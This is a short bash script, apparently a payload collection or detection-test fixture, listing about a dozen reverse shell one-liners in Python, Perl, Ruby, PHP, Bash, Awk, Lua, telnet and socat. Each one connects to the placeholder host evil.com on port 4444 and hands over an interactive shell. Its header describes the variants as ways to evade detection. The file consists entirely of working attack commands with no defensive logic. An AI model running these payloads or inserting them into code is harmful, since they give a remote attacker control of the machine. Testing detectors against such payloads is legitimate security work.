#!/bin/bash
# Various reverse shell implementations that might evade detection

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python with import separation
python3 << 'PYEOF'
import socket as s
import subprocess as sp
import os
sock = s.socket(s.AF_INET, s.SOCK_STREAM)
sock.connect(("evil.com", 4444))
os.dup2(sock.fileno(), 0)
os.dup2(sock.fileno(), 1)
os.dup2(sock.fileno(), 2)
sp.call(["/bin/sh", "-i"])
PYEOF

# Perl reverse shell
perl -e 'use Socket;$i="evil.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Ruby reverse shell
ruby -rsocket -e 'f=TCPSocket.open("evil.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PHP reverse shell
php -r '$sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Bash /dev/tcp (might be detected but let's test)
bash -i >& /dev/tcp/evil.com/4444 0>&1

# Bash with exec
exec 5<>/dev/tcp/evil.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# Awk reverse shell
awk 'BEGIN {s = "/inet/tcp/0/evil.com/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'

# Lua reverse shell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('evil.com','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Telnet reverse shell (two listeners)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | telnet evil.com 4444 > /tmp/f

# Socat reverse shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:evil.com:4444
